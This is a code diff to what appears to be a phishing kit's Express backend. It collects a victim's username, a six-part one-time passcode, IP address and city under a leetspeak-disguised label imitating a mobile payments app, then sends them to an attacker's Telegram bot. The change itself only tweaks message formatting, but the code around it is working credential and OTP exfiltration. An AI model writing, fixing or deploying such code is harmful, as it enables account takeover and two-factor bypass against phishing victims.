@@ -39,6 +39,7 @@ app.post('/api/sendMessage', async (req, res) => {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
             chat_id: CHAT_ID,
             text: message,
+            parse_mode: 'HTML'
         });
         res.status(200).json({ success: true, data: response.data });
     } catch (error) {
@@ -55,7 +56,7 @@ app.post('/api/sendMessage2', async (req, res) => {
     }
 
     // Construir mensaje
-    const message = `🔐🟣B3M0VIL APP🟣\nPAYS: ${country}US4R: <code>${user}</code>\n\nC0D3X: <code>${ote}${ote2}${ote3}${ote4}${ote5}${ote6}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
+    const message = `🔐🟣B3M0VIL APP🟣\nPAYS: ${country}\nUS4R: <code>${user}</code>\n\nC0D3X: <code>${ote}${ote2}${ote3}${ote4}${ote5}${ote6}</code>\n\nIP: ${ip}\nCiudad: ${city}`;
 
     try {
         const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
